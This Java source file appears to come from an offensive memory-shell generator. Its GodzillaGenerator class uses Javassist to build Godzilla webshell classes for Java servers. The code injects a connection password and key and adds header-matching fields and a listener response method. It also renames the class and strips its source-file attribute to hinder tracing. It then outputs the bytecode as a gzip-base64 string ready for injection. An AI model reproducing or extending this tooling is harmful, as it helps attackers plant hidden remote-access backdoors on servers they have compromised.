package jmg.godzilla.generator;

import javassist.ClassClassPath;
import javassist.CtClass;
import jmg.godzilla.util.ShellUtil;
import jmg.core.config.AbstractConfig;
import jmg.core.config.Constants;
import jmg.core.generator.IShellGenerator;
import jmg.core.util.CommonUtil;
import jmg.core.util.JavassistUtil;
import jmg.core.util.ResponseUtil;
import me.gv7.woodpecker.tools.common.FileUtil;

public class GodzillaGenerator implements IShellGenerator {

    @Override
    public void initShell(AbstractConfig config) {
        if (config.getPass() == null) config.setPass(CommonUtil.genRandomLengthString(6));
        if (config.getKey() == null) config.setKey(CommonUtil.genRandomLengthString(6));
    }

    @Override
    public byte[] makeShell(AbstractConfig config) throws Exception {
        initShell(config);
        String shellName = ShellUtil.getShellName(config.getToolType(), config.getShellType());
        String shellClassName = ShellUtil.getShellClassName(shellName);
        byte[] bytes = modifyShell(shellClassName, config);
        config.setShellBytes(bytes);
        config.setShellBytesLength(bytes.length);
        config.setShellGzipBase64String(CommonUtil.encodeBase64(CommonUtil.gzipCompress(bytes)));
        return bytes;
    }

    @Override
    public byte[] modifyShell(String className, AbstractConfig config) {
        byte[] bytes = new byte[0];
        try {
            pool.insertClassPath(new ClassClassPath(GodzillaGenerator.class));
            CtClass ctClass = pool.getCtClass(className);
            // lambda 表达式
            if (!config.getShellType().equals(Constants.SHELL_WF_HANDLERMETHOD)) {
                ctClass.getClassFile().setVersionToJava5();
            }
            JavassistUtil.addStaticFieldIfNotNull(ctClass, "pass", config.getPass());
            JavassistUtil.addStaticFieldIfNotNull(ctClass, "key", CommonUtil.getMd5(config.getKey()).substring(0, 16));

            if (!config.getShellType().equals(Constants.SHELL_WF_HANDLERMETHOD)) {
                JavassistUtil.addFieldIfNotNull(ctClass, "headerName", config.getHeaderName());
                JavassistUtil.addFieldIfNotNull(ctClass, "headerValue", config.getHeaderValue());
            }
            JavassistUtil.setNameIfNotNull(ctClass, config.getShellClassName());

            if (config.getShellType().equals(Constants.SHELL_LISTENER)) {
                String methodBody = ResponseUtil.getMethodBody(config.getServerType());
                JavassistUtil.addMethod(ctClass, "getResponseFromRequest", methodBody);
            }

            JavassistUtil.removeSourceFileAttribute(ctClass);
            bytes = ctClass.toBytecode();
            ctClass.detach();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return bytes;
    }

}
